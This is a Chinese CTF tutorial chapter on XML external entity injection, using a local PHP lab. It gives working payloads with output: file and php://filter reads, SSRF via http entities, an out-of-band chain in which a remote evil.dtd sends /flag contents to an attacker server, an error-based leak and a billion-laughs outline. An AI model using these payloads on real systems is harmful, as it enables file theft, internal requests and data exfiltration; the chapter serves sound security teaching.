---
chapter: Web安全
section: XXE
order: 611
tags:
  - CTF
  - Web安全
  - XXE
  - XML
publish: true
---

# W11 XXE
## XML External Entity Injection

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W02-工具链实战与靶场搭建|W02]] · [[W06-文件包含|W06]]
> **本章目标**：从零掌握 XML 的最小基础（元素、转义、DTD、三类实体）；讲透"libxml 2.9 起默认禁外部实体"与"PHP 需显式传 LIBXML_NOENT"这两个开关，解释为什么新环境里 XXE 经常打不出来；在自建靶上走完有回显读文件、php://filter 读源码、http 实体发请求三条经典利用；掌握参数实体嵌套 + 外部 DTD 中转的 OOB 外带全链与报错回显通道；知道哪些输入点值得测 XXE、无回显时如何确认实体被解析；最后落到不传 NOENT、拒 DTD、白名单三道防御。

[[11-Web安全版图与Burp#3. 九类漏洞版图|11 章]]的九类漏洞表里，XXE 只占一行原理。这一行背后是三类漏洞的同构现象：==XML 的实体机制让"文档里的一小段"变成"去加载某个 URL"的指令，解析器忠实执行==，文件读取、内网请求、数据外带都从这一步长出来。它和 [[W04-SQL注入|W04]]、[[W05-命令注入与代码执行|W05]] 是同一件事——数据与代码的边界被取消，只是这一次"代码"的位置在 XML 解析器里。

XXE 与相邻章节的分工：`php://filter` 这类伪协议的机制在 [[W06-文件包含|W06]] 第 4 节讲过，本章直接复用、不重讲；"服务器替你发请求"的整体打法是 [[W10-SSRF|W10]] 的主题，本章说明 XXE 是它的一个入口；docx/svg 这类"文件里藏着 XML"的入口由 [[W07-文件上传|W07]] 的上传点提供。

> [!note] 本章的实验约定
> 解析端行为按 PHP 8.5 演示（xml 扩展内置，libxml 2.15）；libxml ≥ 2.9 的默认行为是本章绕不开的前提，第 2 节专门讲。靶机跑在 `php -S 127.0.0.1:9110`（[[W02-工具链实战与靶场搭建|W02]] 的用法），攻击者服务器跑在 `python3 -m http.server 9111`，两者都是现成命令。curl 一律带 `--noproxy '*'`（防止代理软件往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），URL 一律用引号包住。payload 一律先存成文件再 `--data-binary @文件` 原样发送，避免 shell 与编码层碰 payload。

## 1. XML 最小基础

XML（eXtensible Markup Language）是一种结构化数据的文本格式，与 HTML 同族：都用标签组织数据，但 XML 的标签名不固定，由写文档的人自己定义。大量系统拿它做配置文件、接口报文（SOAP）、文档容器（docx、svg）。

### 1.1 元素、属性与转义

一个最小的 XML 文档：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<request>
  <username>alice</username>
  <priority level="high"/>
</request>
```

逐行看：

- 第一行是 XML 声明，写版本与编码，可省略但惯例带上；
- `<request>` 是根元素，==一个文档只能有一个根元素==，其余元素都嵌在里面；
- `username` 是普通元素，开始标签与结束标签之间是文本内容；
- `priority` 是自闭合元素，`level="high"` 是属性——属性是写在开始标签里的"名-值"对。

标签之间的文本里不能直接出现 `<` 和 `&`——它们是标记的开始字符，直接写会让解析器把后续内容当成标签。转义的写法是五个预定义实体：

| 写法 | 代表字符 |
| ---- | ---- |
| `&lt;` | `<` |
| `&gt;` | `>` |
| `&amp;` | `&` |
| `&apos;` | `'` |
| `&quot;` | `"` |

写两个解析实验（解析端用 PHP 的 DOMDocument，脚本见 [[#3. 自建靶|第 3 节]]的 lab）：

```php
<?php
// escape.php —— XML 的转义与解析报错
libxml_use_internal_errors(true);

function try_parse($xml) {
    $doc = new DOMDocument();
    $ok = $doc->loadXML($xml);
    echo "loadXML 返回: ";
    var_dump($ok);
    foreach (libxml_get_errors() as $e) {
        echo "错误: ", trim($e->message), " (line {$e->line})\n";
    }
    libxml_clear_errors();
    return $doc;
}

try_parse('<?xml version="1.0"?><r>a < b</r>');            // 文本里出现裸 <

$doc = try_parse('<?xml version="1.0"?><r>a &lt; b</r>');  // 转义后
echo "<r> 内容: ", $doc->getElementsByTagName('r')->item(0)->nodeValue, "\n";
```

```bash
php escape.php
```

输出：

```
loadXML 返回: bool(false)
错误: StartTag: invalid element name (line 1)
loadXML 返回: bool(true)
<r> 内容: a < b
```

裸 `<` 让整份文档解析失败，`&lt;` 还原出字符本身。==实体引用的一般形式就是 `&名字;`：解析器看到它，就把名字对应的内容替换进文档==。

实体与 HTML 的区别一句话：HTML 另有一大批 `&nbsp;`、`&copy;` 这样的命名实体，XML 只预定义上面五个，==想用别的名字，必须在 DTD 里自己声明==——这个"声明一个名字、让解析器把它替换成别的内容"的机制，正是 XXE 的入口。

### 1.2 DTD：文档类型声明

DTD（Document Type Definition，文档类型定义）写在 DOCTYPE 声明里，能声明元素怎么嵌套（ELEMENT）、属性怎么写（ATTLIST）、实体怎么替换（ENTITY）。本章只关心最后一项，但先看全貌：

```xml
<?xml version="1.0"?>
<!DOCTYPE request [
  <!ELEMENT request (username)>
  <!ELEMENT username (#PCDATA)>
]>
<request>
  <username>alice</username>
</request>
```

`<!DOCTYPE request [ ... ]>` 中括号里的部分叫**内部子集**——DTD 就写在文档里。它还有一种形态：中括号换成 `SYSTEM "URL"`，DTD 内容放在另一个文件里，解析器去那个地址取：

```xml
<!DOCTYPE request SYSTEM "http://attacker.example/main.dtd">
```

这叫**外部子集**。==文档自己带着"去哪里取 DTD"的地址，而发这份文档的人可以写任何地址==——第 5 节的 OOB 全链就建立在这个形态上。

### 1.3 实体：三类与两种引用符

实体（entity）是"给一段内容起个名字"。按内容来源分三类：

| 类型 | 声明写法 | 引用位置 | 引用写法 | 行为 |
| ---- | ---- | ---- | ---- | ---- |
| 内部一般实体 | `<!ENTITY hi "hello">` | 元素内容 | `&hi;` | 替换成声明里的值 |
| 外部一般实体 | `<!ENTITY xxe SYSTEM "URL">` | 元素内容 | `&xxe;` | ==去加载 URL 指向的资源，把内容替换进来== |
| 参数实体 | `<!ENTITY % msg "…">` | DTD 内部 | `%msg;` | 在 DTD 里当"DTD 片段"用 |

三个差异点：一般实体用 `&名字;` 引用、出现在元素内容里；参数实体用 `%名字;` 引用、只出现在 DTD 里——`%` 写进元素内容没有任何特殊含义，就是字面字符；外部实体多一个 `SYSTEM "URL"`，URL 可以是 `file://`、`http://`，在 PHP 里还可以是 [[W06-文件包含#4. PHP 伪协议全集|W06]] 讲过的 `php://filter` 一类伪协议。第三行就是 XXE 的核心动作：==声明一个实体，让解析器去读一个 URL，再把读到的内容放进文档==。

三类实体各跑一遍（解析端显式传了 `LIBXML_NOENT`，这个参数第 2 节专门讲）：

```php
<?php
// entity.php —— 三类实体的声明与引用（解析端显式传 LIBXML_NOENT，这个开关第 2 节讲）
libxml_use_internal_errors(true);

function try_parse($label, $xml) {
    echo "== $label ==\n";
    $doc = new DOMDocument();
    $ok = $doc->loadXML($xml, LIBXML_NOENT);
    echo "loadXML 返回: ";
    var_dump($ok);
    foreach (libxml_get_errors() as $e) {
        echo "错误: ", trim($e->message), " (line {$e->line})\n";
    }
    libxml_clear_errors();
    $node = $doc->getElementsByTagName('r')->item(0);
    if ($node !== null) {
        echo "<r> 内容: ", var_export($node->nodeValue, true), "\n";
    }
    echo "\n";
}

try_parse('内部一般实体', '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY hi "hello">]>
<r>&hi;</r>');

try_parse('外部一般实体', '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>
<r>&xxe;</r>');

try_parse('参数实体写进元素内容', '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % msg "pe-content">]>
<r>%msg;</r>');
```

```bash
php entity.php
```

输出：

```
== 内部一般实体 ==
loadXML 返回: bool(true)
<r> 内容: 'hello'

== 外部一般实体 ==
loadXML 返回: bool(true)
<r> 内容: 'flag{xxe_r34d_4ny_f1le}
'

== 参数实体写进元素内容 ==
loadXML 返回: bool(true)
<r> 内容: '%msg;'
```

三条结果与表格一一对应：内部实体替换成声明值；外部实体真的去读了 `/flag`，文件内容（含末尾换行）进了元素；参数实体的 `%msg;` 在元素内容里原样保留。最后一条同时说明：==`&` 与 `%` 的分工是语法层面的，写错位置就失效==——这是后面构造 payload 时反复要用到的分辨力。

## 2. 两个开关：实体为什么默认不生效

把 entity.php 的 payload 打给任何一个当代解析端，大概率什么都不发生。原因有两个开关，缺一个都不行。==新环境里 XXE 打不出来，第一件事就是查这两处==。

### 2.1 开关一：libxml 2.9 起外部实体默认不加载

PHP 的 XML 能力来自 libxml 库。libxml 2.9（2012 年发布）之前，解析器**默认**加载外部实体——那时一份带 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 的 XML 发给任何服务端，文件内容直接回来，不需要任何参数。2.9 起这个默认被反转：外部实体一律不加载，除非调用方显式打开选项。这个反转防的正是 XXE。==老教程的 payload 不用传任何参数就能打，是因为它们写于默认加载的年代==；拿它们打当代环境，现象就是"静默无效"。

先确认解析端的版本：

```bash
php -r 'echo PHP_VERSION, " / libxml ", LIBXML_DOTTED_VERSION, PHP_EOL;'
```

输出：

```
8.5.4 / libxml 2.15.2
```

### 2.2 开关二：PHP 要显式传 LIBXML_NOENT

第二个开关在 PHP 这层：`simplexml_load_string` 与 `DOMDocument::loadXML` 都要显式传 `LIBXML_NOENT`（对应 libxml 的 `XML_PARSE_NOENT`）才会做实体替换。四组对照一次看清：

```php
<?php
// switch.php —— 两个开关对照：默认参数 vs LIBXML_NOENT
libxml_use_internal_errors(true);

function probe($label, $xml, $flags) {
    echo "== $label ==\n";
    $doc = new DOMDocument();
    $ok = ($flags === null) ? $doc->loadXML($xml) : $doc->loadXML($xml, $flags);
    echo "loadXML 返回: ";
    var_dump($ok);
    foreach (libxml_get_errors() as $e) {
        echo "错误: ", trim($e->message), " (line {$e->line})\n";
    }
    libxml_clear_errors();
    $node = $doc->getElementsByTagName('r')->item(0);
    echo "<r> 展开内容: ", var_export($node !== null ? $node->nodeValue : null, true), "\n\n";
}

$internal = '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY hi "hello-entity">]>
<r>&hi;</r>';

$external = '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>
<r>&xxe;</r>';

probe('默认参数 · 内部实体', $internal, null);
probe('默认参数 · 外部实体', $external, null);
probe('LIBXML_NOENT · 内部实体', $internal, LIBXML_NOENT);
probe('LIBXML_NOENT · 外部实体', $external, LIBXML_NOENT);
```

```bash
php switch.php
```

输出：

```
== 默认参数 · 内部实体 ==
loadXML 返回: bool(true)
<r> 展开内容: 'hello-entity'

== 默认参数 · 外部实体 ==
loadXML 返回: bool(true)
<r> 展开内容: ''

== LIBXML_NOENT · 内部实体 ==
loadXML 返回: bool(true)
<r> 展开内容: 'hello-entity'

== LIBXML_NOENT · 外部实体 ==
loadXML 返回: bool(true)
<r> 展开内容: 'flag{xxe_r34d_4ny_f1le}
'
```

simplexml 同型：

```php
<?php
// simple_check.php —— simplexml_load_string 的默认参数与 LIBXML_NOENT 对照
libxml_use_internal_errors(true);

$external = '<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>
<r>&xxe;</r>';

$s = simplexml_load_string($external);
echo "默认参数     : ";
var_dump($s === false ? false : (string)$s);

$s = simplexml_load_string($external, 'SimpleXMLElement', LIBXML_NOENT);
echo "LIBXML_NOENT : ";
var_dump($s === false ? false : (string)$s);
```

```bash
php simple_check.php
```

输出：

```
默认参数     : string(0) ""
LIBXML_NOENT : string(24) "flag{xxe_r34d_4ny_f1le}
"
```

三个要点：

- 默认参数下==解析不报错、文档解析成功，只是外部实体的位置什么都没有==——外部实体既不加载也不替换，`&xxe;` 悄悄变成空。这就是"payload 明明是对的却打不出来"的标准长相；
- `LIBXML_NOENT` 一开，实体替换连着外部加载一起放行——==2012 年被按下去的攻击面，由这一个参数拉回来==；
- 内部实体不含 `SYSTEM`，默认参数下（DOM 解析）照样展开——第 7 节的 DoS 用的正是这条不受开关管的路。

> [!info]- libxml_disable_entity_loader 的废弃史
> 老代码里常见一个函数 `libxml_disable_entity_loader()`，作用是"关掉外部实体加载"——它是 2.9 之前年代给 PHP 侧补的刹车。libxml 2.9 把默认反转之后，这个函数失去了存在意义，PHP 8.0 起废弃：
>
> ```bash
> php -d error_reporting=E_ALL -d display_errors=1 -r 'var_dump(libxml_disable_entity_loader());'
> ```
>
> 输出：
>
> ```
> PHP Deprecated:  Function libxml_disable_entity_loader() is deprecated since 8.0, as external entity loading is disabled by default in Command line code on line 1
>
> Deprecated: Function libxml_disable_entity_loader() is deprecated since 8.0, as external entity loading is disabled by default in Command line code on line 1
> bool(false)
> ```
>
> 报错原文把因果说全了：deprecated since 8.0, as external entity loading is disabled by default。读到还在调它的老代码，知道它是上一代防御即可；当代防御见第 9 节。

## 3. 自建靶

lab 目录贯穿全章：

```
labs/w11/
├── vuln.php          ← 主靶：显式传 LIBXML_NOENT，实体会被解析
├── safe.php          ← 对照靶：默认参数解析
├── fixed.php         ← 修复靶：第 9 节用
├── escape.php entity.php pe_limit.php switch.php simple_check.php
│                     ← 第 1、2 节的实验脚本
├── p_*.xml           ← 各节 payload
└── evil/             ← 攻击者服务器目录（9111 端口）
    ├── evil.dtd
    ├── evil_error.dtd
    └── secret.txt
```

主靶一行解析逻辑，其余是回显用的常规代码：

```php
<?php
// vuln.php —— XXE 主靶：显式传 LIBXML_NOENT，实体解析开启
$raw = file_get_contents('php://input');
$data = simplexml_load_string($raw, 'SimpleXMLElement', LIBXML_NOENT);
if ($data === false) {
    echo "parse failed\n";
    exit;
}
echo "username: ", $data->username ?? '(missing)', "\n";
```

对照靶只少第三个参数：

```php
<?php
// safe.php —— 对照靶：默认参数解析，外部实体不加载
$raw = file_get_contents('php://input');
$data = simplexml_load_string($raw);
if ($data === false) {
    echo "parse failed\n";
    exit;
}
echo "username: ", $data->username ?? '(missing)', "\n";
```

靶从 `php://input` 读原始请求体，POST 什么就解析什么。起靶（`php -S` 的用法见 [[W02-工具链实战与靶场搭建|W02]]；`display_errors=1` 让解析报错直接进 HTTP 响应，第 6 节的报错回显依赖它）：

```bash
cd ~/labs/w11
php -S 127.0.0.1:9110 -d display_errors=1
```

攻击者服务器另开一个终端（第 4.3、5、6 节用，它的请求日志打在自己的终端上）：

```bash
cd ~/labs/w11/evil
python3 -m http.server 9111 --bind 127.0.0.1
```

再放一个后续要读的标记文件（需要 root）：

```bash
echo 'flag{xxe_r34d_4ny_f1le}' | sudo tee /flag
```

输出：

```
flag{xxe_r34d_4ny_f1le}
```

正常请求过一遍。payload 存成文件，`--data-binary @文件` 原样发送：

```xml
<?xml version="1.0"?>
<request>
  <username>alice</username>
</request>
```

```bash
curl -s --noproxy '*' --data-binary @p_normal.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
username: alice
```

靶回显解析出的 `username` 字段——回显就是第 4 节全部利用的出口。

## 4. 经典利用：有回显

回显在，就让"读到的内容"坐进 `<username>` 里跟出来。三条路对应实体 SYSTEM 后的三种 URL。

### 4.1 file://：读任意文件

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<request>
  <username>&xxe;</username>
</request>
```

```bash
curl -s --noproxy '*' --data-binary @p_file.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
username: flag{xxe_r34d_4ny_f1le}
```

解析器读到 DOCTYPE 里的外部实体声明；解析到 `&xxe;` 时按 SYSTEM 的 URL 发起读取；`file:///flag` 的内容替换进元素，随响应回来。==路径是解析端进程视角的绝对路径==，`/flag`、`/etc/passwd`、Web 应用配置文件都是同一写法。

同一个 payload 打给 safe.php（默认参数解析）：

```bash
curl -s --noproxy '*' --data-binary @p_file.xml http://127.0.0.1:9110/safe.php
```

输出：

```
username:
```

内容为空、不报错——2.2 节的"静默无效"在靶上的样子。打靶先分辨靶属于哪一类，别把 safe 靶的沉默当成 payload 写错了。

### 4.2 php://filter：读源码

直接 `file://` 读 PHP 源码，内容里若有 `&`、`<` 一类字符会破坏文档结构；套一层 base64 过滤器，读到的就只剩安全字符。`php://filter` 的机制 [[W06-文件包含#4.2 php://filter：读源码与过滤器管道|W06 4.2]] 讲过，这里直接复用：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=vuln.php">
]>
<request>
  <username>&xxe;</username>
</request>
```

```bash
curl -s --noproxy '*' --data-binary @p_filter.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
username: PD9waHAKLy8gdnVsbi5waHAg4oCU4oCUIFhYRSDkuLvpnbbvvJrmmL7lvI/kvKAgTElCWE1MX05PRU5U77yM5a6e5L2T6Kej5p6Q5byA5ZCvCiRyYXcgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsKJGRhdGEgPSBzaW1wbGV4bWxfbG9hZF9zdHJpbmcoJHJhdywgJ1NpbXBsZVhNTEVsZW1lbnQnLCBMSUJYTUxfTk9FTlQpOwppZiAoJGRhdGEgPT09IGZhbHNlKSB7CiAgICBlY2hvICJwYXJzZSBmYWlsZWRcbiI7CiAgICBleGl0Owp9CmVjaG8gInVzZXJuYW1lOiAiLCAkZGF0YS0+dXNlcm5hbWUgPz8gJyhtaXNzaW5nKScsICJcbiI7Cg==
```

本地剥掉回显前缀解码：

```bash
curl -s --noproxy '*' --data-binary @p_filter.xml http://127.0.0.1:9110/vuln.php | sed 's/^username: //' | base64 -d
```

输出：

```
<?php
// vuln.php —— XXE 主靶：显式传 LIBXML_NOENT，实体解析开启
$raw = file_get_contents('php://input');
$data = simplexml_load_string($raw, 'SimpleXMLElement', LIBXML_NOENT);
if ($data === false) {
    echo "parse failed\n";
    exit;
}
echo "username: ", $data->username ?? '(missing)', "\n";
```

解码即得靶的完整源码。读源码的价值与 [[W06-文件包含|W06]] 相同：==拿 flag 只是下限，源码里常有硬编码凭据、下一层漏洞的入口==——本章的靶若部署在真实环境，第一动作就该是把它自己的源码读出来。

### 4.3 http://：让服务器发请求

SYSTEM 后写 http URL，解析器就替你向那个地址发请求；如果地址指向的也是可控资源，响应内容同样坐进回显：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9111/secret.txt">
]>
<request>
  <username>&xxe;</username>
</request>
```

```bash
curl -s --noproxy '*' --data-binary @p_http.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
username: attacker-controlled-content
```

攻击者服务器的终端同时多了一行：

```
127.0.0.1 - - [23/Oct/2026 22:32:58] "GET /secret.txt HTTP/1.1" 200 -
```

两个事实同时成立：靶的响应里出现了攻击者服务器上的文件内容；靶对 9111 发起了一次 GET。后者就是 [[W10-SSRF|W10]] 的主题——==XXE 是 SSRF 的一个入口==：服务器替你发请求这件事，入口从 `?url=` 参数换成了 XML 实体，[[W10-SSRF|W10]] 的内网探测、协议手法在实体 SYSTEM 后同样适用。回显能把响应带出来是少数情况；大多数真实场景没有回显，请求发得出去、内容带不回来——这就是下一节要解决的问题。

## 5. 无回显：OOB 外带

OOB（Out-Of-Band，带外）指数据不走 HTTP 响应、改走攻击者控制的另一条通道。XXE 的外带通道就是 4.3 那次 GET：==把要偷的文件内容拼进请求 URL==，攻击者服务器日志里读它。难点在于"拼"这一步受 XML 语法的两条限制。

### 5.1 内部子集的两条限制

要把 `/flag` 的内容拼进外带 URL，自然的写法是：声明 `%file;` 读文件，再声明一个实体，值是"带 `%file;` 展开结果的 URL"。把这个想法直接写进文档的内部子集（`pe_limit.php`，payload 同 [[#3. 自建靶|第 3 节]] lab 的 `p_oob_inline.xml`）：

```php
<?php
// pe_limit.php —— 内部子集里使用参数实体的两处限制
libxml_use_internal_errors(true);

function try_parse($label, $xml) {
    echo "== $label ==\n";
    $doc = new DOMDocument();
    $ok = $doc->loadXML($xml, LIBXML_NOENT);
    echo "loadXML 返回: ";
    var_dump($ok);
    foreach (libxml_get_errors() as $e) {
        echo "错误: ", trim($e->message), " (line {$e->line})\n";
    }
    libxml_clear_errors();
    echo "\n";
}

try_parse('在两条声明的间隙里引用参数实体', '<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % file SYSTEM "file:///flag">
%file;
]>
<r>x</r>');

try_parse('把参数实体嵌进另一条实体的值', '<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'http://127.0.0.1:9111/?d=%file;\'>">
%eval;
%send;
]>
<r>x</r>');
```

```bash
php pe_limit.php
```

输出：

```
== 在两条声明的间隙里引用参数实体 ==
loadXML 返回: bool(false)
错误: Content error in the internal subset (line 1)

== 把参数实体嵌进另一条实体的值 ==
loadXML 返回: bool(false)
错误: PEReferences forbidden in internal subset (line 4)
错误: Entity 'eval' not defined (line 5)
错误: Entity 'send' not defined (line 6)
```

第一处：`%file;` 引用写在两条声明的间隙里，展开结果是文件内容——它落在"该出现声明"的位置上，不是合法声明，解析直接失败。参数实体在内部子集里就算能引用，也只能"拼声明"，不能"拼数据"。

第二处是要害：==XML 规范规定，内部子集的实体值里不允许出现参数实体引用==，libxml 的报错就是原话——PEReferences forbidden in internal subset。而"把 `%file;` 嵌进外带 URL 的值里"恰恰是这种写法。

两条限制合起来得出结论：==组装外带 URL 的那一步，只能发生在外部子集里==。而外部子集就是 1.2 节那个"文档里写着地址、解析器去取"的 DTD 文件——地址归发文档的人写。于是完整打法：把嵌套逻辑写成一份 DTD 文件放在攻击者服务器上，payload 里只留一个对外部子集的引用，让目标自己来取。

### 5.2 全链：远程 DTD 组装外带

攻击者服务器上的 `evil/evil.dtd`，四行各干一件事：

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://127.0.0.1:9111/?d=%file;'>">
%eval;
%send;
```

- 第 1 行：`%file;` 声明为"读 `/flag` 并 base64"。先编码是因为文件原文可能含 `&`、`<`、空格、换行，直接拼进 URL 会破坏外带请求的结构；base64 之后只剩字母、数字和三个 URL 安全符号；
- 第 2 行：`%eval;` 的**值**是另一条实体声明。值里写 `%` 要用字符引用 `&#x25;`——直接写字面 `%send;` 会被当成参数实体引用，又撞上 5.1 的限制；`%file;` 写在这里，展开后 base64 就拼进了 URL；
- 第 3 行：引用 `%eval;`，展开出 `%send;` 的声明；
- 第 4 行：引用 `%send;`，声明生效并立刻触发请求——`GET /?d=<base64>` 发向攻击者服务器。

发给目标的 payload 反而极短，内部子集只做一件事：

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://127.0.0.1:9111/evil.dtd">
  %remote;
]>
<request>
  <username>bob</username>
</request>
```

==`%remote;` 必须被引用==——声明只登记名字，引用这一步才触发拉取；拉回来的 evil.dtd 作为 DTD 的一部分继续解析，那四行才生效。打靶：

```bash
curl -s --noproxy '*' --data-binary @p_oob.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
<br />
<b>Warning</b>:  simplexml_load_string(): http://127.0.0.1:9111/?d=ZmxhZ3t4eGVfcjM0ZF80bnlfZjFsZX0K:1: parser error : Content error in the internal subset in <b>/home/hua/labs/w11/vuln.php</b> on line <b>4</b><br />
……（同一报错又打印了一轮，省略）……
parse failed
```

响应是失败的——但攻击者服务器的终端在同一时刻多出两行：

```
127.0.0.1 - - [23/Oct/2026 22:33:09] "GET /evil.dtd HTTP/1.1" 200 -
127.0.0.1 - - [23/Oct/2026 22:33:09] "GET /?d=ZmxhZ3t4eGVfcjM0ZF80bnlfZjFsZX0K HTTP/1.1" 200 -
```

第一行是目标来取 evil.dtd，第二行就是外带本体。本地解码：

```bash
echo ZmxhZ3t4eGVfcjM0ZF80bnlfZjFsZX0K | base64 -d
```

输出：

```
flag{xxe_r34d_4ny_f1le}
```

文件内容经目标的解析器之手，落在了攻击者的日志里。==解析失败与外带成功互不妨碍==：外带在第 4 步就完成了，此后的报错发生在攻击者服务器的响应被当 DTD 内容解析的时候——见下方折叠框。

> [!info]- 响应为什么是 parse failed
> `%send;` 触发的请求返回了 http.server 的目录列表页（`<!DOCTYPE HTML>` 开头的 HTML），解析器把这份返回内容当成 DTD 继续解析，HTML 不是合法声明，报 Content error。真实攻击里让外带 URL 返回一个空 200（或任意纯文本）即可消除报错；更重要的是无回显场景根本不看响应——判断成败的唯一依据是攻击者服务器有没有收到回连。

> [!warning] 链上每一环都要"被引用"
> 这条链断在半路的排查顺序：payload 里 `%remote;` 声明了却忘了引用——evil.dtd 根本不会被拉取（攻击者日志一条都没有）；evil.dtd 里 `%eval;`、`%send;` 两行少引用任何一行，后面的声明不生效。每一环都是"声明 + 引用"成对出现，少了引用整段静默失效。

## 6. 报错回显

外带通道要走网络；还有一条更近的路：==解析报错本身会带着出错的 URL 原文==。让一个故意不存在的实体引用失败，报错文本就把拼进 URL 的文件内容带回了响应。只需把 evil.dtd 换一份：

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexist/%file;'>">
%eval;
%err;
```

外带 URL 换成 `file:///nonexist/<base64>`——解析器去读这个不存在的文件，I/O 报错里带着完整路径。payload 与第 5 节同型（`p_err.xml`，指向 `evil_error.dtd`）：

```bash
curl -s --noproxy '*' --data-binary @p_err.xml http://127.0.0.1:9110/vuln.php
```

输出：

```
<br />
<b>Warning</b>:  simplexml_load_string(): http://127.0.0.1:9111/evil_error.dtd:4: I/O warning : failed to load &quot;file:///nonexist/ZmxhZ3t4eGVfcjM0ZF80bnlfZjFsZX0K&quot;: No such file or directory in <b>/home/hua/labs/w11/vuln.php</b> on line <b>4</b><br />
……（后续为报错位置的回显行，省略）……
username: bob
```

`file:///nonexist/` 后面跟着的就是 `/flag` 的 base64，解码：

```bash
echo ZmxhZ3t4eGVfcjM0ZF80bnlfZjFsZX0K | base64 -d
```

输出：

```
flag{xxe_r34d_4ny_f1le}
```

三个边界：

- 它同样需要外部 DTD——嵌套参数实体的限制（5.1）不分通道；
- 它依赖报错进响应——本章靶的 `-d display_errors=1` 是前提，生产环境关了报错这条路就没了，只剩 OOB；
- 数据进的是报错文本，长度受报错与 URL 长度限制，大文件仍走 OOB。

## 7. 拒绝服务：递归实体膨胀

实体还可以嵌套自己的同类：一条内部实体的值里引用另一条内部实体。每条实体把前一条重复十次，声明十层，展开就是十的十次方个字符——这就是 **billion laughs**。==内部实体不含 SYSTEM，不受第 2 节任何一个开关管==，默认参数的解析器照样展开，所以 DoS 在"配置完全正确"的服务上也能打。libxml 对实体展开有放大系数与深度上限（未开 `XML_PARSE_HUGE` 时），超过即中止解析，单次请求打不挂服务，但拖慢解析、消耗内存足以构成一次可测的拒绝服务。

> [!info]- billion laughs 的构造形状
> 构造不配输出，形状如下——十层声明，每层引用上一层十次：
>
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE r [
>   <!ENTITY a "aaaaaaaaaa">
>   <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
>   <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
>   <!-- 按此规律写到 j，展开量即 10^10 个字符 -->
> ]>
> <r>&j;</r>
> ```
>
> 防护与第 9 节重合：拒绝带 DTD 的提交体，递归声明根本没有进入解析器的机会。

## 8. 判别与流程

### 8.1 什么输入点值得测

XXE 的入口就是"有一段 XML 会被服务端解析"。按出现频率排：

| 输入点 | 识别特征 | 说明 |
| ---- | ---- | ---- |
| XML API 请求体 | `Content-Type: application/xml` / `text/xml`，或 body 以 `<?xml` 开头 | 最直接：DOCTYPE 塞在文档最前面 POST 过去 |
| SOAP 服务 | 报文里有 `Envelope`，或有 wsdl | DOCTYPE 塞在信封之前，写法同上 |
| Office 文档上传 | `.docx` `.xlsx` `.pptx` | 三者都是 zip 包着一组 XML（如 `word/document.xml`），见下文 |
| SVG 上传 | `.svg` | SVG 本身就是 XML，服务端做缩略图、消毒处理时的解析库若开实体即可打；浏览器渲染 SVG 里的脚本是另一条线（[[W08-XSS\|W08]]），别混 |
| 配置与数据导入 | "XML 导入""XML-RPC""SAML" | 同请求体，payload 嵌进对应结构 |

docx 值得单独说一段，它是 CTF 与真实渗透里的高频入口。一个 `.docx` 解开就是这样一个包：`word/document.xml` 装正文，还有一批描述样式与关系的 XML。当服务端"收一份 docx、解析其中的内容"（预览、检索、转格式），==解析动作发生在包内的 XML 上，注入点也就搬进了包里==：自己构造一个 zip，把第 5 节的 payload 写进 `word/document.xml`，按正常文档传上去——上传点本身可以毫无漏洞（[[W07-文件上传|W07]] 的全部过滤对它都成立，因为这份 docx 是完全合法的文档），漏洞在被解析的内部。打这类靶先确认两件事：解析端是谁（PHP/libxml 还是 Java 的另一套解析器，开关与语法都不同）、包内路径是否写对。

### 8.2 无回显时怎么确认实体被解析

无回显时连"payload 生效没有"都看不见，按可靠度排三个判据：

1. **OOB 回连**：攻击者服务器收到 `GET /evil.dtd`，说明外部 DTD 被拉取——实体机制在解析端是开着的；收到 `?d=` 外带，通道直接可用。这是唯一能区分"实体被解析"与"根本没解析"的判据；
2. **时间**：让实体指向一个明显慢的端点（或让响应体很大），对比提交 DOCTYPE 前后的响应耗时，明显变慢说明加载发生了；
3. **报错差异**：同一文档分别指向存在与不存在的资源，若响应的报错形态随之变化，说明解析器真的在处理实体。

判定通过后按场景选通道：有回显走第 4 节，报错可见走第 6 节，否则 OOB（第 5 节）。

## 9. 防御

三道防线，第一道就是本章开头那两个开关的镜像。

